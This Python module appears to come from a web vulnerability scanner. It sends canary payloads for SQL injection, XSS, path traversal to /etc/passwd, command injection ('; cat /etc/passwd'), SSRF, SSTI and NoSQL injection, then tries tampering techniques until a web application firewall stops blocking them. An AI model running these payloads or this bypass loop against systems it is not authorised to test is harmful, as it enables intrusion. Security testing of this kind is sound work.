from . import tampering
from .detection import match_signatures

BLOCK_CODES = [400, 403, 406, 500, 501]

CANARY_PAYLOADS = {
    'sqli': "' OR '1'='1",
    'xss': "<script>alert(1)</script>",
    'lfi': "../../../../etc/passwd",
    'cmdi': "; cat /etc/passwd",
    'ssrf': "http://127.0.0.1/",
    'ssti': "{{7*7}}",
    'nosqli': "' || '1'=='1",
}

TECHNIQUES_BY_VTYPE = {
    'sqli': tampering.SQLI_TECHNIQUES,
    'xss': tampering.XSS_TECHNIQUES,
    'lfi': tampering.LFI_TECHNIQUES,
    'cmdi': tampering.CMDI_TECHNIQUES,
    'ssrf': tampering.SSRF_TECHNIQUES,
    'ssti': tampering.SSTI_TECHNIQUES,
    'nosqli': tampering.NOSQLI_TECHNIQUES,
}


def _is_blocked(engine, response):
    if response is None:
        return True
    if response.status_code in BLOCK_CODES:
        return True

    signatures = match_signatures(response, heuristic=True)
    if any(sig.endswith("(Body)") for sig in signatures):
        return True

    return False


def probe_and_get_technique(engine, url, method, other_params, target_param, vtype, waf_name):
    cached = engine.get_bypass_technique(vtype, url)
    if cached is not None:
        return cached if cached != "__NONE__" else None

    if vtype not in CANARY_PAYLOADS:
        engine.set_bypass_technique(vtype, url, "__NONE__")
        return None

    if getattr(engine, 'waf_is_blocking', True) is False:
        if engine.config['verbose']:
            print(f"[BYPASS] WAF non-bloquant sur ce point d'entrée, oracle ignoré pour {vtype}.")
        engine.set_bypass_technique(vtype, url, "__NONE__")
        return None

    canary = CANARY_PAYLOADS[vtype]

    baseline_resp = engine._send_request(
        url, method=method,
        data={**other_params, target_param: canary} if method == 'POST' else None,
        params={**other_params, target_param: canary} if method == 'GET' else None
    )

    if not _is_blocked(engine, baseline_resp):
        engine.set_bypass_technique(vtype, url, "__NONE__")
        return None

    for technique in TECHNIQUES_BY_VTYPE[vtype]:
        tampered = tampering.apply_tampering(canary, vtype, True, waf_name, technique=technique)

        resp = engine._send_request_raw(url, method, other_params, target_param, tampered)

        if not _is_blocked(engine, resp):
            engine.add_bypass_finding(vtype, url, waf_name, technique, True, canary)
            engine.set_bypass_technique(vtype, url, technique)
            return technique

    engine.add_bypass_finding(vtype, url, waf_name, "aucune (" + ", ".join(TECHNIQUES_BY_VTYPE[vtype]) + ")", False, canary)
    engine.set_bypass_technique(vtype, url, "__NONE__")
    return None
